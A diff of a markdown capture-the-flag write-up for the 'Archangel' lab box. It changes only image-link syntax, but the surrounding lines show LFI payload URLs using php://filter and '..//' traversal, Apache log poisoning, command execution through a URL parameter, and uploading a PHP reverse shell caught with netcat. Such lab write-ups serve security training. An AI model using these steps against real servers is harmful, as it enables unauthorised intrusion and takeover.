@@ -55,21 +55,21 @@ Pressing the button I find the URL changes to `test.php?view=/var/www/html/devel
 
 The URL shown can be vulnerable to several things, such as SQL injection, directory traversal, RFI and LFI. Testing one by one I find most of them end with a `Not Allowed` response.
 
-(https://spy0x7.cf/assets/archangel/notallowed.png)
+![notallowed](https://spy0x7.cf/assets/archangel/notallowed.png)
 
 
 Testing [PHP Wrappers](https://medium.com/@Aptive/local-file-inclusion-lfi-web-application-penetration-testing-cc9dc8dd3601) for LFI, I find that it is possible to convert the page to base64
 
 `http://mafialive.thm/test.php?view=php://filter/convert.base64-encode/resource=/var/www/html/development_testing/mrrobot.php`
 
-(https://spy0x7.cf/assets/archangel/base64.png)
+![base64](https://spy0x7.cf/assets/archangel/base64.png)
 
 
 Trying to read /etc/passwd still fails, so I try to read the test.php file instead to see what filtering is happening
 
 `http://mafialive.thm/test.php?view=php://filter/convert.base64-encode/resource=/var/www/html/development_testing/test.php`
 
-(https://spy0x7.cf/assets/archangel/base.png)
+![base64](https://spy0x7.cf/assets/archangel/base.png)
 
 
 This gives a long base64 value. I save it to my machine then decrypt it
@@ -118,7 +118,7 @@ I test the double backslash to see if I can read /etc/passwd.
 `http://mafialive.thm/test.php?view=/var/www/html/development_testing/..//..//..//..//..//etc/passwd`
 
 
-(https://spy0x7.cf/assets/archangel/passwd.png)
+![passwd](https://spy0x7.cf/assets/archangel/passwd.png)
 
 I can now use this to search the box. Looking for SSH keys do not work and I can’t read any useful files, so I try log poisoning. First, I need to find where the logs are stored. Testing the default places, I find `/var/log/apache2/access.log` contains all logs for the HTTP server.
 
@@ -126,7 +126,7 @@ I can now use this to search the box. Looking for SSH keys do not work and I can
 `view-source:http://mafialive.thm/test.php?view=/var/www/html/development_testing/..//..//..//..//var/log/apache2/access.log`
 
 
-(https://spy0x7.cf/assets/archangel/log.png)
+![log](https://spy0x7.cf/assets/archangel/log.png)
 
 
 Scrolling to the bottom of this log file, I see all of my requests through the LFI vulnerable.
@@ -136,15 +136,14 @@ Scrolling to the bottom of this log file, I see all of my requests through the L
 
 Refreshing access.log, I see my php code is now in the log file
 
-(https://spy0x7.cf/assets/archangel/php.png)
-
+![php](https://spy0x7.cf/assets/archangel/php.png)
 
 I can now test command execution
 
 `view-source:http://mafialive.thm/test.php?view=/var/www/html/development_testing/..//..//..//..//var/log/apache2/access.log&c=whoami`
 
 
-(https://spy0x7.cf/assets/archangel/www.png)
+![www](https://spy0x7.cf/assets/archangel/www.png)
 
 
 Since I can execute commands, I can upload files. Using a [PHP Reverse Shell](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php) I can upload this file and then navigate to it. I setup up a python HTTP Server on my local machine then use wget to upload the file
@@ -158,7 +157,7 @@ It was uploaded correctly, now I need to see where it is exactly. Running a pwd 
 
 `view-source:http://mafialive.thm/test.php?view=/var/www/html/development_testing/..//..//..//..//var/log/apache2/access.log&c=pwd`
 
-(https://spy0x7.cf/assets/archangel/pwd.png)
+![pwd](https://spy0x7.cf/assets/archangel/pwd.png)
 
 
 With the file now uploaded, I can set up a netcat listener and navigate to `http://mafialive.thm/php-reverse-shell.php` to gain a reverse shell
@@ -188,7 +187,7 @@ www-data@ubuntu:/$`
 
 I can now read the second flag
 
-(https://spy0x7.cf/assets/archangel/flag2.png)
+![flag2](https://spy0x7.cf/assets/archangel/flag2.png)
 
 
 Exploiting archangel User
@@ -267,7 +266,7 @@ archangel@ubuntu:~$`
 Now, I can read the 3rd flag
 
 
-(https://spy0x7.cf/assets/archangel/flag3.jpg)
+![flag3](https://spy0x7.cf/assets/archangel/flag3.jpg)
 
 
 ## Privilege Escalation to root
@@ -325,7 +324,7 @@ root@ubuntu:/tmp#`
 
 As root, I can now read the final flag
 
-(https://spy0x7.cf/assets/archangel/root.png)
+![root](https://spy0x7.cf/assets/archangel/root.png)
 
 
 Exit.py
